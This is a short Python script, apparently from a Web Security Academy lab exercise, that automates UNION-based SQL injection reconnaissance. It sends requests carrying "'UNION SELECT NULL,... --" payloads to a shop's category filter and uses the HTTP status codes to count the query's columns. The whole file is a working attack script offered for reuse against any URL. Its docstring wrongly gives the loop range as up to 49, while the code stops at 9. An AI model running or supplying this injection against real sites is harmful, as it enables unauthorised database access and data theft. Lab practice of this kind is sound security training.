#payloads finds the number of columns using null
import requests
def nullinjection(url):
    '''
    The code defines a function named null_injection that takes a url parameter.
    It iterates through a range from 1 to 49 (inclusive) using a for loop.
    Inside the loop, it constructs a string query by multiplying the string "NULL," with the current index i. This creates a string with i occurrences of "NULL,".
    It then removes the last comma from the query string using query[0:-1] to eliminate the trailing comma.
    The code sends a GET request to the specified url by concatenating the URL with the SQL injection payload 'UNION SELECT followed by the query string, and then ' -- to comment out the rest of the SQL query.
    If the response status code is 500, it prints a message indicating that the column with index i caused an internal 500 error.
    If the response status code is 200, it prints a message indicating the total number of columns found (i) and returns that value.
    '''
    for i in range(1,10):#this defines the range of columns
        
        query = "NULL,"*i #multiply by the number of columns
        query = query[0:-1]#this will remove the last comma of NULL,
        r = requests.get(url + " 'UNION SELECT " + query + " -- ")
        if r.status_code == 500:
            print("Column {} gave the internal 500 error".format(i))
        elif r.status_code == 200:
            print("Total number of columns are {}".format(i))
            return i
url = 'https://0a54006703874062818c70830065003b.web-security-academy.net/filter?category=Gifts'#this is where you paste the site to test for the columns 
cols = nullinjection(url)
